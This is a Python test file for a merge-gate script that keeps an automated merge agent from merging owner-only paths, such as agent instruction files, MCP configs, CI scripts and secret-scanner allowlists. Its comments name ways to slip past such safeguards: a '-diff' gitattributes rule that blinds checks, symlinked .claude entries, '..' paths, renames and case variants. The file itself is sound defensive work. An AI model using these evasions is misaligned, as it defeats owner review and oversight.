                 "gradle/wrapper/gradle-wrapper.properties", "gradle/verification-metadata.xml", ".github/CODEOWNERS",  # the PROTECTED ones: see below
                 "gradlew", "gradlew.bat", "scripts/test_warnings_gate.py", "scripts/test_jdk_release_gate.py",  # R2-01: what CI runs through ci_scope.py
                 "config/licensee/google-sdk-terms.txt", "config/licensee/policy.gradle",  # R2-02: licence acceptances
                 "docs/FOLLOW-UPS.md", "docs/SECURITY.md", "docs/orchestrator-state.md")  # R2-07: canonical process and policy docs
        for name in names:
            with self.subTest(name=name):
                self.refused(make_api(files=[file_entry("README.md"), file_entry(name)]), r"outside kind general.*" + re.escape(name))

    def test_a_recolour_of_the_signed_off_design_tokens_is_refused(self):  # R3-01: the owner signed design/tokens.json off (#15 7011560493, 7019570467)
        recolour = '@@ -9 +9 @@\n-    "primary": "#006878",\n+    "primary": "#7A1FA2",'
        self.refused(make_api(files=[file_entry("design/tokens.json", patch=recolour), file_entry("app/ui/theme/Theme.kt")]),
                     r"outside kind general.*design/tokens\.json")

    def test_claude_code_instruction_files_outside_the_root_are_owner_only(self):  # R4-01: Claude Code loads these as agent instructions
        names = ("CLAUDE.local.md", "app/CLAUDE.md", "docs/milestones/CLAUDE.md", "core/domain/CLAUDE.local.md", "app/claude.md", "App/CLAUDE.LOCAL.md",
                 "app/.claude/skills/x/SKILL.md", "firebase/.claude/commands/x.md", "x/.Claude/rules/y.md")
        for name in names:
            with self.subTest(name=name):
                self.refused(make_api(files=[file_entry(name)]), r"outside kind general.*" + re.escape(name))
        for name in ("docs/claude-notes.md", "docs/claude.md.txt", "docs/dot.claude-notes/a.md"):  # similar names under docs/ stay general
            with self.subTest(name=name):
                self.assertFalse(merge_ready.owner_only(name))

    def test_files_that_change_what_agents_load_or_what_checks_see_are_owner_only(self):  # R5-01, R5-02, R5-03: owner decision #15 7057687236
        names = (".gitattributes", "app/.gitattributes", "docs/milestones/.gitattributes",  # `*.kt -diff` blinds the guards and secrets checks
                 ".mcp.json", "app/.MCP.json",  # project MCP servers load without asking in cloud sessions
                 "app/.claude", "docs/milestones/.claude", "x/.Claude",  # a symlink named .claude is one git entry whose last component is .claude
                 ".gitleaks.toml", ".gitleaksignore", "app/.gitleaksignore")  # gitleaks's own allowlists
        for name in names:
            with self.subTest(name=name):
                self.refused(make_api(files=[file_entry(name)]), r"outside kind general.*" + re.escape(name))
        for name in ("docs/gitattributes.md", "docs/mcp.json.md", "docs/gitleaks-notes.md", "docs/claude-notes.txt"):  # similar names under docs/ stay general
            with self.subTest(name=name):
                self.assertFalse(merge_ready.owner_only(name))

    def test_dotdot_and_a_rename_from_an_owner_only_path_are_refused(self):
        for entry, reason in ((file_entry("scripts/../CLAUDE.md"), r"\.\."),
                              (file_entry("scripts/x.py", status="renamed", previous="scripts/guards.sh"), r"scripts/guards\.sh")):
            with self.subTest(reason=reason):
                self.refused(make_api(files=[entry]), reason)

    def test_a_working_draft_sign_off_or_removal_is_still_the_owners(self):
        flip = "@@ -3 +3 @@\n-Status: working draft; not owner-approved (see issue #15).\n+Status: approved by the owner."
        for f in (file_entry("docs/PLAN.md", patch=flip), {"filename": "docs/PLAN.md", "status": "removed"},
                  {"filename": "docs/milestones/M1.md", "status": "renamed", "previous_filename": "docs/milestones/old.md"}):
            with self.subTest(f=f):
                self.refused(make_api(files=[f]), r"(not owner-approved|sign-off|removal)")

    def test_a_working_draft_without_a_patch_is_refused(self):  # R2-05: the API omits the patch of a large diff, so the status line cannot be checked
        self.refused(make_api(files=[file_entry("docs/PLAN.md", patch=None)]), r"no patch")

    def test_every_draft_still_carries_its_status_line(self):  # R2-06: a sign-off PR must also take the file off the draft list
        files = subprocess.run(["git", "ls-files"], cwd=ROOT, capture_output=True, text=True, check=True).stdout.splitlines()
        drafts = [f for f in files if f.casefold() in merge_ready.GENERAL_DRAFT_FILES or f.casefold().startswith(merge_ready.GENERAL_DRAFT_PREFIXES)]
        self.assertGreaterEqual(len(drafts), 2)  # docs/PLAN.md and a milestone doc
        for name in drafts:
            if name.endswith((".md", ".json")):
                with self.subTest(name=name):
                    self.assertIn(merge_ready.DRAFT_STATUS, (ROOT / name).read_text(encoding="utf-8"))

    def test_process_files_from_the_guard_list_are_owner_only(self):  # R1-03: the set comes from pretooluse_guard.PROTECTED, not a second list
        for entry in pretooluse_guard.PROTECTED:
            with self.subTest(entry=entry):
                self.assertTrue(merge_ready.owner_only(entry + ("x" if entry.endswith("/") else "")))
        for name in ("scripts/install-hooks.sh", "scripts/install_linters.sh", "scripts/linters.pins", ".tools/bin/shellcheck", "app/mark-ready.sh",
                     "x/update-branch.sh", "scripts/update-branch.sh", "docs/milestones/x/mark-ready.sh", "docs/milestones/scripts/update-branch.sh",
                     "docs/milestones/package.json", "docs/milestones/requirements-x.txt"):  # R3-03: the draft exception does not cover wrappers or manifests
            self.refused(make_api(files=[file_entry(name)]), r"outside kind general.*" + re.escape(name))

    def test_approved_product_docs_and_gate_docs_are_owner_only(self):  # R1-04: only the real drafts are not
        for name in ("docs/product/flow.md", "docs/product/stories.md", "docs/product/rubric.md", "docs/product/wireframes/01-sign-in-dark.png",
                     "docs/ANDROID-BEST-PRACTICES.md"):
            self.refused(make_api(files=[file_entry(name)]), r"outside kind general.*" + re.escape(name))

    def test_every_script_a_required_ci_job_runs_is_owner_only(self):  # R1-05: still true, now because every scripts/ path is
        ci = (ROOT / ".github" / "workflows" / "ci.yml").read_text(encoding="utf-8")
        found = set(re.findall(r"scripts/[\w./-]+\.(?:py|sh)", ci))
        self.assertIn("scripts/check_gradle_repos.py", found)
        for name in sorted(found):
            with self.subTest(name=name):
                self.assertTrue(merge_ready.owner_only(name))
        for name in ci_scope.SELFTESTS:  # run through `ci_scope.py selftests`, so no literal path in ci.yml (R2-01)
            self.assertTrue(merge_ready.owner_only(name), name)
        self.assertTrue(merge_ready.owner_only("scripts/verify.sh"), "fail-closed: every scripts/ path is owner-only, not only the ones CI runs")

    def test_case_variants_of_owner_only_paths_are_refused(self):  # R1-06
        for name in ("claude.md", ".Claude/settings.local.json", ".Githooks/post-checkout", "Scripts/Hooks/x.py", "DOCS/orchestration.md", "Agents/x.md"):
            self.refused(make_api(files=[file_entry(name)]), r"outside kind general")

    def test_the_common_checks_still_apply(self):
        self.refused(make_api(files=[file_entry(self.ALLOWED[0])], state="behind"), r"mergeable_state.*behind")
        self.refused(make_api(files=[file_entry(self.ALLOWED[0])], body="Fixes #1"), r"closing keyword")
        self.refused(make_api(files=[file_entry(self.ALLOWED[0])], checks=[run("guards"), run("tasks")]), r"static.*missing")


class WiringTests(unittest.TestCase):
    """The tests and the script must run in verify.sh and CI, and the process docs must tell the merge agent to run only the script."""

    def read(self, rel):
        return (ROOT / rel).read_text(encoding="utf-8")

    def active(self, text):
        return [ln.strip() for ln in text.splitlines() if ln.strip() and not ln.strip().startswith("#")]

    def test_verify_runs_the_tests(self):
        self.assertIn("step merge-ready-tests python3 -I scripts/test_merge_ready.py", self.active(self.read("scripts/verify.sh")))

    def test_ci_runs_the_tests(self):
        self.assertIn("run: python3 -I scripts/test_merge_ready.py", self.active(self.read(".github/workflows/ci.yml")))

    def test_script_and_tests_are_protected_process_files(self):
        guard = self.read("scripts/hooks/pretooluse_guard.py")
        for path in ("scripts/merge_ready.py", "scripts/test_merge_ready.py"):
            self.assertIn(f'"{path}",', guard)

    def test_docs_tell_the_merge_agent_to_run_from_clean_main(self):
        self.assertRegex(self.read("docs/ORCHESTRATION.md"), r"(?i)clean checkout of `origin/main`")

    def test_docs_tell_the_merge_agent_to_run_only_the_script(self):
        doc = self.read("docs/ORCHESTRATION.md")
        self.assertIn("scripts/merge_ready.py <N> <sha> <kind>", doc)
        self.assertRegex(doc, r"(?i)merge agent[^\n]*runs? only")

    def test_docs_describe_the_pin_tag_check_and_the_cooldown(self):
        doc = self.read("docs/ORCHESTRATION.md")
        self.assertRegex(doc, r"(?is)merge agent.*git ls-remote.*annotated tags dereferenced")
        self.assertRegex(doc, r"(?i)7-day `cooldown`")

    def test_docs_name_every_kind_of_the_script(self):
        doc = self.read("docs/ORCHESTRATION.md")
        for word in sorted(merge_ready.KINDS) + ["standing authorization"]:
            with self.subTest(word=word):
                self.assertIn(word, doc)

    R6_ALLOWLIST = (r"kind `general` is fail-closed \(owner decision, #15 comment 7058755858, replacing ruling 1 of #15 comment 7019683156\): only kotlin "
                    r"sources and tests under `app/src/` and `core/<module>/src/`, app resources and docs files that are not owner-only may merge as "
                    r"`general`; every other path, including config, dotfiles, build scripts, workflows, `firebase/` and `scripts/`, is owner-only by default")

    R7_RISK = (r"also owner-only for `general`: kotlin outside `dev/listicles/`, `dev/listicles/testing/` outside `core/testing`, kotest `projectconfig` and "
               r"`packageconfig` classes, every `lint\.xml` and `lint-baseline\.xml`, `res/xml/` and `docs/collaborating\.md`\. `docs/tasks\.toml` merges as "
               r"`general` only when the diff changes nothing but the `status` and `pr` fields of agent tasks \(owner decision, #15 comment 7059534826\)\. "
               r"residual risk: a path list cannot stop every test-weakening change inside source directories, so the pr reviewer stays the main defence")

    def test_docs_record_the_r7_rules_and_the_residual_risk(self):
        doc = re.sub(r"\s+", " ", self.read("docs/ORCHESTRATION.md")).lower()
        self.assertRegex(doc, self.R7_RISK)
        self.assertNotRegex(doc.replace("also owner-only for `general`", "also allowed for `general`"), self.R7_RISK)
        self.assertNotRegex(doc.replace("so the pr reviewer stays the main defence", "so no reviewer is needed"), self.R7_RISK)

    def test_docs_record_the_allowlist_and_the_interim_route(self):  # owner decision #15 7058755858, R2-04
        doc = re.sub(r"\s+", " ", self.read("docs/ORCHESTRATION.md")).lower()
        for pattern in (
                r"for the kinds `working-draft-docs`, `tasks-sync`, `dependabot` and `general` the merge agent runs only",
                r"until kind `owner-batch` exists, an owner-approved owner-only pr is merged by hand under d1 and d2 \(#15 comment 7007421567\)",
                self.R6_ALLOWLIST):
            with self.subTest(pattern=pattern):
                self.assertRegex(doc, pattern)

    def test_the_allowlist_pin_fails_when_the_sentence_is_reversed(self):  # a later 'owner-only' elsewhere must not satisfy it
        doc = re.sub(r"\s+", " ", self.read("docs/ORCHESTRATION.md")).lower()
        self.assertNotRegex(doc.replace("is owner-only by default", "may merge as `general`"), self.R6_ALLOWLIST)
        self.assertNotRegex(doc.replace("is fail-closed", "is open"), self.R6_ALLOWLIST)

    def test_wiring_helper_ignores_commented_lines(self):
        self.assertEqual(self.active("# step x\n  run: y\n"), ["run: y"])


if __name__ == "__main__":
    unittest.main()
